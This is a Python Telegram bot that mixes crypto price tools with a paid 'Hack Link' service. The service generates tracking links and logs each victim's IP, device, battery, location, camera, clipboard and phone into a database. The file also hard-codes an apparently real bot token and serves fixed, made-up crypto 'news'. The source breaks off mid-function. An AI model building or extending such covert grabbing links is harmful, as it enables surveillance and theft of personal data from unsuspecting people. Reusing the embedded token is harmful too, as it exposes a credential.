import telebot
from telebot import types
import sqlite3
import datetime
import uuid
import time
import json
import os
import requests
from flask import Flask, request, render_template_string, redirect
import threading
import matplotlib.pyplot as plt
from io import BytesIO
from apscheduler.schedulers.background import BackgroundScheduler

# ==================== CONFIG ====================
BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"   # <-- Apna token yahan dalo
OWNER_ID = 6504476778
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==================== DATABASE ====================
DB_PATH = 'bot.db'

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  is_paid INTEGER DEFAULT 0,
                  subscription_end TEXT,
                  phone TEXT,
                  location TEXT,
                  language TEXT DEFAULT 'en')''')
    # Links table
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  original_url TEXT,
                  modified_url TEXT,
                  created_at TEXT,
                  clicks INTEGER DEFAULT 0)''')
    # Clicks table
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  screen TEXT,
                  language TEXT,
                  platform TEXT,
                  timezone TEXT,
                  battery TEXT,
                  location TEXT,
                  camera TEXT,
                  clipboard TEXT,
                  phone TEXT,
                  timestamp TEXT)''')
    # Coins supply cache
    c.execute('''CREATE TABLE IF NOT EXISTS coins
                 (symbol TEXT PRIMARY KEY,
                  supply REAL,
                  last_updated TIMESTAMP)''')
    # Price alerts
    c.execute('''CREATE TABLE IF NOT EXISTS alerts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  coin TEXT,
                  target_price REAL,
                  is_above BOOLEAN,
                  created_at TIMESTAMP)''')
    # Owner ads table
    c.execute('''CREATE TABLE IF NOT EXISTS ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  button_text TEXT,
                  link TEXT,
                  photo_file_id TEXT,
                  duration_minutes INTEGER,
                  created_at TIMESTAMP,
                  expires_at TIMESTAMP,
                  is_active BOOLEAN DEFAULT 1,
                  views INTEGER DEFAULT 0)''')
    # Rewarded ads table
    c.execute('''CREATE TABLE IF NOT EXISTS rewarded_ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  title TEXT,
                  description TEXT,
                  link TEXT,
                  logo_file_id TEXT,
                  is_active BOOLEAN DEFAULT 1,
                  created_at TIMESTAMP)''')
    # User ReCOIN balance and ad views
    c.execute('''CREATE TABLE IF NOT EXISTS user_coins
                 (user_id INTEGER PRIMARY KEY,
                  recoin INTEGER DEFAULT 0,
                  ad_view_count INTEGER DEFAULT 0,
                  last_ad_time TIMESTAMP)''')
    # Ad views tracking for rewarded ads
    c.execute('''CREATE TABLE IF NOT EXISTS ad_views
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  ad_id INTEGER,
                  viewed_at TIMESTAMP,
                  earned INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
    print("✅ Database ready")

# ==================== BASE URL ====================
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://mohyan-telegram-bot.onrender.com')

# ==================== CRYPTO HELPER FUNCTIONS ====================
def get_binance_price(symbol):
    url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
    try:
        response = requests.get(url, timeout=5)
        data = response.json()
        return float(data['price'])
    except:
        return None

def get_coin_supply_from_coincap(symbol):
    url = f"https://api.coincap.io/v2/assets/{symbol.lower()}"
    try:
        response = requests.get(url, timeout=5)
        data = response.json()['data']
        return float(data['supply'])
    except:
        return None

def get_supply_from_db(symbol):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT supply, last_updated FROM coins WHERE symbol=?", (symbol.upper(),))
    row = c.fetchone()
    conn.close()
    if row:
        last = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() - last < datetime.timedelta(hours=24):
            return row[0]
    return None

def update_coin_supply(symbol, supply):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO coins (symbol, supply, last_updated) VALUES (?, ?, ?)",
              (symbol.upper(), supply, datetime.datetime.now()))
    conn.commit()
    conn.close()

def get_market_data(coin_symbol, coin_name_for_api):
    symbol_map = {
        'BTC': 'BTCUSDT',
        'ETH': 'ETHUSDT',
        'BNB': 'BNBUSDT',
        'XRP': 'XRPUSDT',
        'DOGE': 'DOGEUSDT',
        'USDT': 'USDTUSDT',
        'USDC': 'USDCUSDT',
        'ADA': 'ADAUSDT',
        'SOL': 'SOLUSDT',
        'DOT': 'DOTUSDT'
    }
    binance_symbol = symbol_map.get(coin_symbol.upper())
    if not binance_symbol:
        return None
    price = get_binance_price(binance_symbol)
    if not price:
        return None

    supply = get_supply_from_db(coin_symbol.upper())
    if not supply:
        supply = get_coin_supply_from_coincap(coin_name_for_api.lower())
        if supply:
            update_coin_supply(coin_symbol.upper(), supply)
        else:
            fallback_supply = {
                'BTC': 19600000,
                'ETH': 120000000,
                'BNB': 150000000,
                'XRP': 45000000000,
                'DOGE': 140000000000,
                'USDT': 83000000000,
                'USDC': 74000000000,
                'ADA': 35000000000,
                'SOL': 430000000,
                'DOT': 1300000000
            }
            supply = fallback_supply.get(coin_symbol.upper())
    if not supply:
        return None

    market_cap = price * supply
    return {'price': price, 'market_cap': market_cap, 'supply': supply}

def format_market_cap(cap):
    if cap >= 1e12:
        return f"{cap/1e12:.2f}T"
    elif cap >= 1e9:
        return f"{cap/1e9:.2f}B"
    elif cap >= 1e6:
        return f"{cap/1e6:.2f}M"
    else:
        return f"{cap:,.0f}"

def format_price(price):
    if price < 1:
        return f"${price:.4f}"
    elif price < 1000:
        return f"${price:.2f}"
    else:
        return f"${price:,.0f}"

# ==================== GRAPH GENERATION ====================
def generate_price_chart(symbol, days=7):
    try:
        url = f"https://api.binance.com/api/v3/klines?symbol={symbol}USDT&interval=1d&limit={days}"
        resp = requests.get(url, timeout=5)
        data = resp.json()
        dates = [datetime.datetime.fromtimestamp(int(k[0])/1000).strftime('%d %b') for k in data]
        prices = [float(k[4]) for k in data]
        plt.figure(figsize=(10, 5))
        plt.plot(dates, prices, marker='o', linestyle='-', color='#3b82f6', linewidth=2)
        plt.fill_between(dates, prices, alpha=0.3, color='#3b82f6')
        plt.title(f'{symbol} Price Chart - Last {days} Days', fontsize=16, fontweight='bold')
        plt.xlabel('Date', fontsize=12)
        plt.ylabel('Price (USDT)', fontsize=12)
        plt.grid(True, alpha=0.3)
        plt.xticks(rotation=45)
        buf = BytesIO()
        plt.tight_layout()
        plt.savefig(buf, format='png', dpi=100)
        buf.seek(0)
        plt.close()
        return buf
    except Exception as e:
        print(f"Chart error: {e}")
        return None

# ==================== PRICE ALERTS ====================
scheduler = BackgroundScheduler()
scheduler.start()

def check_alerts():
    conn = get_db()
    c = conn.cursor()
    alerts = c.execute("SELECT * FROM alerts").fetchall()
    for alert in alerts:
        price = get_binance_price(alert['coin']+'USDT')
        if not price:
            continue
        if (alert['is_above'] and price >= alert['target_price']) or (not alert['is_above'] and price <= alert['target_price']):
            try:
                bot.send_message(alert['user_id'], f"🔔 *Alert Triggered*\n{alert['coin']} price is now {price} (target: {alert['target_price']})", parse_mode="Markdown")
            except:
                pass
            c.execute("DELETE FROM alerts WHERE id=?", (alert['id'],))
    conn.commit()
    conn.close()

scheduler.add_job(check_alerts, 'interval', minutes=5)

# ==================== LIVE MARKET DATA ====================
TOP_COINS = [
    ('BTC', 'bitcoin'),
    ('ETH', 'ethereum'),
    ('BNB', 'binancecoin'),
    ('XRP', 'ripple'),
    ('DOGE', 'dogecoin'),
    ('USDT', 'tether'),
    ('USDC', 'usd-coin'),
    ('ADA', 'cardano'),
    ('SOL', 'solana'),
    ('DOT', 'polkadot')
]

def get_all_market_data(limit=7):
    coins_data = []
    for symbol, api_name in TOP_COINS[:limit]:
        market = get_market_data(symbol, api_name)
        if market:
            change = 0
            try:
                url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol}USDT"
                resp = requests.get(url, timeout=5)
                change = float(resp.json()['priceChangePercent'])
            except:
                pass
            coins_data.append({
                'symbol': symbol,
                'price': market['price'],
                'market_cap': market['market_cap'],
                'change': change
            })
    return coins_data

def format_market_message(coins):
    if not coins:
        return "❌ Market data unavailable."
    msg = "📊 *Market Cap*\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━\n\n"
    for coin in coins:
        color = "🟢" if coin['change'] >= 0 else "🔴"
        arrow = "▲" if coin['change'] >= 0 else "▼"
        cap_str = format_market_cap(coin['market_cap'])
        price_str = format_price(coin['price'])
        msg += f"{color} *{coin['symbol']:<4}*  {cap_str:>8}  "
        msg += f"Buy {price_str:>8}  {arrow}{abs(coin['change']):.2f}%\n"
    msg += "\n━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')} IST"
    return msg

# ==================== LIVE UPDATES WORKER ====================
active_live_updates = {}
live_update_lock = threading.Lock()

def stop_button_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⏹️ Stop Updates", callback_data="stop_live_updates"))
    return markup

def live_updates_worker():
    while True:
        time.sleep(5)
        with live_update_lock:
            if not active_live_updates:
                continue
            coins = get_all_market_data(limit=7)
            if not coins:
                continue
            msg = format_market_message(coins)
            to_remove = []
            for user_id, data in active_live_updates.items():
                if data.get('stop'):
                    to_remove.append(user_id)
                    continue
                try:
                    bot.edit_message_text(
                        msg,
                        chat_id=data['chat_id'],
                        message_id=data['message_id'],
                        parse_mode='Markdown',
                        reply_markup=stop_button_markup()
                    )
                except:
                    to_remove.append(user_id)
            for uid in to_remove:
                del active_live_updates[uid]

threading.Thread(target=live_updates_worker, daemon=True).start()

# ==================== ADS EXPIRY WORKER ====================
def check_expired_ads():
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now()
    c.execute("UPDATE ads SET is_active=0 WHERE expires_at < ? AND is_active=1", (now,))
    conn.commit()
    conn.close()
    print("✅ Expired ads deactivated")

scheduler.add_job(check_expired_ads, 'interval', minutes=1)

# ==================== CHECK PREMIUM (OWNER FIRST) ====================
def is_premium(user_id):
    if user_id == OWNER_ID:          # Owner always premium
        return True
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row or row[0] == 0:
        return False
    if row[1] == 'permanent':
        return True
    if row[1]:
        end_date = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() < end_date:
            return True
    return False

# ==================== OWNER ADS HELPERS ====================
def get_active_ad():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM ads WHERE is_active=1 ORDER BY created_at DESC LIMIT 1")
    ad = c.fetchone()
    conn.close()
    return ad

# ==================== START MENU ====================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🪙 Crypto"),
        types.KeyboardButton("🔗 Hack Link")
    )
    return markup

def crypto_submenu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💰 BTC", callback_data="price_btc"),
        types.InlineKeyboardButton("💰 ETH", callback_data="price_eth"),
        types.InlineKeyboardButton("💰 DOGE", callback_data="price_doge"),
        types.InlineKeyboardButton("📈 Live Market", callback_data="live_market"),
        types.InlineKeyboardButton("🔔 Set Alert", callback_data="alert_menu"),
        types.InlineKeyboardButton("📊 Price Graph", callback_data="graph_menu"),
        types.InlineKeyboardButton("📰 News", callback_data="news"),
        types.InlineKeyboardButton("🪙 Get ReCOIN", callback_data="getcoin"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    )
    return markup

def hack_submenu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔗 Generate Link", callback_data="gen_link"),
        types.InlineKeyboardButton("📊 Log History", callback_data="log_history"),
        types.InlineKeyboardButton("💰 Balance", callback_data="balance"),
        types.InlineKeyboardButton("ℹ️ Bot Info", callback_data="bot_info"),
        types.InlineKeyboardButton("💎 Subscription", callback_data="subscription"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    )
    return markup

@bot.message_handler(commands=['start'])
def start_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
              (message.from_user.id, message.from_user.username))
    if message.from_user.id == OWNER_ID:
        c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
    conn.commit()
    conn.close()
    welcome = """
╔══════════════════════╗
║  *CRYPTO & HACK BOT*  ║
╚══════════════════════╝

🔹 *Crypto Features:*
• Real-time prices
• Live market updates
• Price alerts
• Charts & news
• Earn ReCOIN by watching ads

🔹 *Hack Link Features:*
• Generate tracking links
• Visitor info (IP, device, etc.)
• Premium plans

👇 *Select a category*
    """
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🪙 Crypto")
def crypto_menu(message):
    bot.send_message(message.chat.id, "🪙 *Crypto Commands*", parse_mode="Markdown", reply_markup=crypto_submenu())

@bot.message_handler(func=lambda m: m.text == "🔗 Hack Link")
def hack_menu(message):
    bot.send_message(message.chat.id, "🔗 *Hack Link Commands*", parse_mode="Markdown", reply_markup=hack_submenu())

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "back_main":
        bot.edit_message_text("Main Menu", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    elif call.data == "price_btc":
        price_with_ads(call.message, 'BTC', 'bitcoin')
    elif call.data == "price_eth":
        price_with_ads(call.message, 'ETH', 'ethereum')
    elif call.data == "price_doge":
        price_with_ads(call.message, 'DOGE', 'dogecoin')
    elif call.data == "live_market":
        live_market_command(call.message)
    elif call.data == "alert_menu":
        bot.send_message(call.message.chat.id, "🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", parse_mode="Markdown")
    elif call.data == "graph_menu":
        bot.send_message(call.message.chat.id, "📊 *Price Graph*\nUse: /price_btc, /price_eth, /price_doge", parse_mode="Markdown")
    elif call.data == "news":
        news_command(call.message)
    elif call.data == "getcoin":
        get_coin_command(call.message)
    elif call.data == "gen_link":
        gen_link(call.message)
    elif call.data == "log_history":
        history_cmd(call.message)
    elif call.data == "balance":
        balance_cmd(call.message)
    elif call.data == "bot_info":
        info_cmd(call.message)
    elif call.data == "subscription":
        subscription_cmd(call.message)
    elif call.data == "stop_live_updates":
        with live_update_lock:
            if call.from_user.id in active_live_updates:
                active_live_updates[call.from_user.id]['stop'] = True
                del active_live_updates[call.from_user.id]
        bot.edit_message_text("⏹️ Live updates stopped.", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "Updates stopped.")
    elif call.data == "refresh_ads":
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        manage_ads_command(call.message)
    elif call.data.startswith("ad_extend_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        bot.send_message(call.message.chat.id, f"Send new duration in minutes for ad #{ad_id}:")
        bot.register_next_step_handler(call.message, extend_ad, ad_id)
    elif call.data.startswith("ad_stop_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE ads SET is_active=0 WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Ad stopped")
        bot.send_message(call.message.chat.id, f"Ad #{ad_id} stopped.")
    elif call.data.startswith("ad_delete_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM ads WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Ad deleted")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif call.data.startswith("verify_ad_"):
        verify_ad(call)
    elif call.data.startswith("activate_rad_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE rewarded_ads SET is_active=1 WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Ad activated")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    elif call.data.startswith("deactivate_rad_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE rewarded_ads SET is_active=0 WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Ad deactivated")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    elif call.data.startswith("delete_rad_"):
        if call.from_user.id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only owner")
            return
        ad_id = int(call.data.split("_")[2])
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM rewarded_ads WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Ad deleted")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif call.data.startswith("recoin_"):
        recoin_purchase(call)

# ==================== PRICE WITH ADS ====================
def price_with_ads(message, coin_symbol, coin_api_name):
    data = get_market_data(coin_symbol, coin_api_name)
    if not data:
        bot.reply_to(message, "❌ Data unavailable.")
        return

    price_str = format_price(data['price'])
    cap_str = format_market_cap(data['market_cap'])

    msg = f"""
╔══════════════════════╗
║    *{coin_symbol} PRICE*    ║
╠══════════════════════╣
║  💰 {price_str}          ║
║  📊 Market Cap: {cap_str} ║
╚══════════════════════╝
    """

    markup = types.InlineKeyboardMarkup(row_width=1)

    if not is_premium(message.from_user.id):
        ad = get_active_ad()
        if ad:
            redirect_url = f"{BASE_URL}/ad_click/{ad['id']}"
            ad_button = types.InlineKeyboardButton(ad['button_text'], url=redirect_url)
            markup.add(ad_button)
            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
            markup.add(remove_ads)

    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=markup if markup.keyboard else None)

@bot.message_handler(commands=['btc'])
def btc_command(message):
    price_with_ads(message, 'BTC', 'bitcoin')

@bot.message_handler(commands=['eth'])
def eth_command(message):
    price_with_ads(message, 'ETH', 'ethereum')

@bot.message_handler(commands=['doge'])
def doge_command(message):
    price_with_ads(message, 'DOGE', 'dogecoin')

# ==================== PRICE WITH GRAPH ====================
@bot.message_handler(commands=['price_btc'])
def price_btc_graph(message):
    data = get_market_data('BTC', 'bitcoin')
    if not data:
        bot.reply_to(message, "❌ Data unavailable.")
        return

    loading = bot.reply_to(message, "⏳ *Generating chart...*", parse_mode="Markdown")
    img = generate_price_chart('BTC', 7)
    if not img:
        bot.edit_message_text("❌ Chart generation failed.", loading.chat.id, loading.message_id)
        return

    caption = f"""
📈 *Bitcoin 7d Chart*
💰 Price: ${data['price']:,.2f}
📊 Market Cap: {format_market_cap(data['market_cap'])}
    """
    bot.send_photo(message.chat.id, img, caption=caption, parse_mode="Markdown")
    bot.delete_message(loading.chat.id, loading.message_id)

    # Show ad if free user (owner is premium so no ad)
    if not is_premium(message.from_user.id):
        ad = get_active_ad()
        if ad:
            markup = types.InlineKeyboardMarkup()
            redirect_url = f"{BASE_URL}/ad_click/{ad['id']}"
            ad_button = types.InlineKeyboardButton(ad['button_text'], url=redirect_url)
            markup.add(ad_button)
            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
            markup.add(remove_ads)
            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)

# ==================== LIVE MARKET COMMAND ====================
@bot.message_handler(commands=['live:all_cryptos'])
def live_market_command(message):
    wait_msg = bot.reply_to(message, "⏳ *Fetching live market data...*", parse_mode="Markdown")
    coins = get_all_market_data(limit=7)
    if not coins:
        bot.edit_message_text("❌ Market data unavailable.", wait_msg.chat.id, wait_msg.message_id)
        return
    msg = format_market_message(coins)
    bot.edit_message_text(msg, wait_msg.chat.id, wait_msg.message_id, parse_mode='Markdown', reply_markup=stop_button_markup())

    if not is_premium(message.from_user.id):
        ad = get_active_ad()
        if ad:
            markup = types.InlineKeyboardMarkup()
            redirect_url = f"{BASE_URL}/ad_click/{ad['id']}"
            ad_button = types.InlineKeyboardButton(ad['button_text'], url=redirect_url)
            markup.add(ad_button)
            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
            markup.add(remove_ads)
            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)

    with live_update_lock:
        active_live_updates[message.from_user.id] = {
            'chat_id': message.chat.id,
            'message_id': wait_msg.message_id,
            'stop': False
        }

# ==================== ALERT COMMANDS ====================
@bot.message_handler(commands=['coin:alert'])
def alert_command(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /coin:alert_BTC_price 65000")
        return
    try:
        cmd_parts = parts[0].split('_')
        coin = cmd_parts[2]
        target = float(parts[1])
    except:
        bot.reply_to(message, "Invalid format. Use: /coin:alert_BTC_price 65000")
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⬆️ Above", callback_data=f"alert_set_{coin}_above_{target}"),
        types.InlineKeyboardButton("⬇️ Below", callback_data=f"alert_set_{coin}_below_{target}")
    )
    bot.reply_to(message, f"Set alert for {coin} at ${target}:", reply_markup=markup)

# ==================== NEWS ====================
def get_crypto_news():
    return [
        "📰 Bitcoin ETF sees record inflows",
        "📰 Ethereum 2.0 upgrade date announced",
        "📰 Binance launches new staking program",
        "📰 Dogecoin accepted by major retailer",
        "📰 Ripple legal battle update"
    ]

@bot.message_handler(commands=['news'])
def news_command(message):
    news = get_crypto_news()
    msg = "📰 *Top Crypto News*\n━━━━━━━━━━━━━━━━━━━━━\n"
    for i, n in enumerate(news, 1):
        msg += f"{i}. {n}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━"
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

    if not is_premium(message.from_user.id):
        ad = get_active_ad()
        if ad:
            markup = types.InlineKeyboardMarkup()
            redirect_url = f"{BASE_URL}/ad_click/{ad['id']}"
            ad_button = types.InlineKeyboardButton(ad['button_text'], url=redirect_url)
            markup.add(ad_button)
            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
            markup.add(remove_ads)
            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)

# ==================== REWARDED ADS (ReCOIN) ====================
@bot.message_handler(commands=['getcoin'])
def get_coin_command(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM rewarded_ads WHERE is_active=1 ORDER BY created_at DESC")
    ads = c.fetchall()
    conn.close()

    if not ads:
        bot.reply_to(message, "❌ No rewarded ads available right now. Check back later!")
        return

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (message.from_user.id,))
    row = c.fetchone()
    recoin = row[0] if row else 0
    if not row:
        c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?, 0, 0)", (message.from_user.id,))
        conn.commit()
    conn.close()

    msg = f"""
💰 *EARN ReCOIN BY WATCHING ADS*

Your ReCOIN Balance: {recoin}
━━━━━━━━━━━━━━━━━━━━━

*How it works:*
1. Click 👁️ View on any ad below
2. Wait a few seconds on the website
3. Come back and click ✅ Verify
4. Earn 0.5 ReCOIN per ad (2 ads = 1 ReCOIN)

━━━━━━━━━━━━━━━━━━━━━
    """
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

    for ad in ads:
        markup = types.InlineKeyboardMarkup()
        view_btn = types.InlineKeyboardButton(f"👁️ View: {ad['title']}", url=ad['link'])
        verify_btn = types.InlineKeyboardButton(f"✅ Verify", callback_data=f"verify_ad_{ad['id']}")
        markup.add(view_btn, verify_btn)

        if ad['logo_file_id']:
            bot.send_photo(message.chat.id, ad['logo_file_id'], caption=ad['description'], reply_markup=markup)
        else:
            bot.send_message(message.chat.id, f"*{ad['title']}*\n{ad['description']}", parse_mode="Markdown", reply_markup=markup)

def verify_ad(call):
    ad_id = int(call.data.split('_')[2])
    user_id = call.from_user.id

    conn = get_db()
    c = conn.cursor()

    # Check if already verified today
    c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND ad_id=? AND date(viewed_at)=date('now')", (user_id, ad_id))
    count = c.fetchone()[0]
    if count > 0:
        bot.answer_callback_query(call.id, "❌ You've already earned for this ad today!")
        conn.close()
        return

    # Rate limit: 30 seconds between verifications
    c.execute("SELECT viewed_at FROM ad_views WHERE user_id=? ORDER BY viewed_at DESC LIMIT 1", (user_id,))
    last = c.fetchone()
    if last:
        last_time = datetime.datetime.strptime(last[0], '%Y-%m-%d %H:%M:%S.%f')
        if datetime.datetime.now() - last_time < datetime.timedelta(seconds=30):
            bot.answer_callback_query(call.id, "⏳ Please wait 30 seconds between verifications!")
            conn.close()
            return

    # Daily limit: max 10 ads
    c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND date(viewed_at)=date('now')", (user_id,))
    daily_count = c.fetchone()[0]
    if daily_count >= 10:
        bot.answer_callback_query(call.id, "❌ Daily limit of 10 ads reached. Come back tomorrow!")
        conn.close()
        return

    # Record this view
    c.execute("INSERT INTO ad_views (user_id, ad_id, viewed_at, earned) VALUES (?, ?, ?, 1)", (user_id, ad_id, datetime.datetime.now()))

    # Get user's current view count and recoin
    c.execute("SELECT ad_view_count, recoin FROM user_coins WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if row:
        view_count = row[0] + 1
        recoin = row[1]
    else:
        view_count = 1
        recoin = 0
        c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?, 0, 1)", (user_id,))

    if view_count % 2 == 0:
        recoin += 1
        c.execute("UPDATE user_coins SET recoin=?, ad_view_count=? WHERE user_id=?", (recoin, view_count, user_id))
        bot.answer_callback_query(call.id, f"✅ Congratulations! You earned 1 ReCOIN. Total: {recoin}")
    else:
        c.execute("UPDATE user_coins SET ad_view_count=? WHERE user_id=?", (view_count, user_id))
        bot.answer_callback_query(call.id, f"✅ Ad verified! {2 - (view_count % 2)} more ad to earn 1 ReCOIN.")

    conn.commit()
    conn.close()

# ==================== OWNER COMMANDS FOR REWARDED ADS ====================
@bot.message_handler(commands=['createrewardad'])
def create_reward_ad_start(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command.")
        return
    msg = bot.reply_to(message, "📝 Send me the **title** for the rewarded ad:")
    bot.register_next_step_handler(msg, create_reward_ad_title)

def create_reward_ad_title(message):
    title = message.text.strip()
    msg = bot.reply_to(message, "📝 Send me the **description** for the ad:")
    bot.register_next_step_handler(msg, create_reward_ad_desc, title)

def create_reward_ad_desc(message, title):
    desc = message.text.strip()
    msg = bot.reply_to(message, "🔗 Send me the **link** for the ad (e.g., https://example.com):")
    bot.register_next_step_handler(msg, create_reward_ad_link, title, desc)

def create_reward_ad_link(message, title, desc):
    link = message.text.strip()
    if not link.startswith(('http://', 'https://')):
        bot.reply_to(message, "❌ Invalid link. Must start with http:// or https://. Try again from /createrewardad.")
        return
    msg = bot.reply_to(message, "🖼️ Send me a **logo photo** for the ad (optional, send /skip to skip):")
    bot.register_next_step_handler(msg, create_reward_ad_photo, title, desc, link)

def create_reward_ad_photo(message, title, desc, link):
    if message.text and message.text == "/skip":
        photo_file_id = None
    elif message.photo:
        photo_file_id = message.photo[-1].file_id
    else:
        bot.reply_to(message, "❌ Please send a photo or /skip. Try again from /createrewardad.")
        return

    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO rewarded_ads (title, description, link, logo_file_id, created_at)
                 VALUES (?, ?, ?, ?, ?)''',
              (title, desc, link, photo_file_id, datetime.datetime.now()))
    conn.commit()
    ad_id = c.lastrowid
    conn.close()

    bot.reply_to(message, f"✅ Rewarded ad created successfully!\nID: {ad_id}")

@bot.message_handler(commands=['listrewardads'])
def list_reward_ads(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command.")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM rewarded_ads ORDER BY created_at DESC")
    ads = c.fetchall()
    conn.close()

    if not ads:
        bot.send_message(message.chat.id, "📭 No rewarded ads found.")
        return

    for ad in ads:
        status = "🟢 Active" if ad['is_active'] else "🔴 Inactive"
        text = f"ID: {ad['id']}\nTitle: {ad['title']}\nLink: {ad['link']}\nStatus: {status}"
        markup = types.InlineKeyboardMarkup()
        if ad['is_active']:
            markup.add(types.InlineKeyboardButton("🔴 Deactivate", callback_data=f"deactivate_rad_{ad['id']}"))
        else:
            markup.add(types.InlineKeyboardButton("🟢 Activate", callback_data=f"activate_rad_{ad['id']}"))
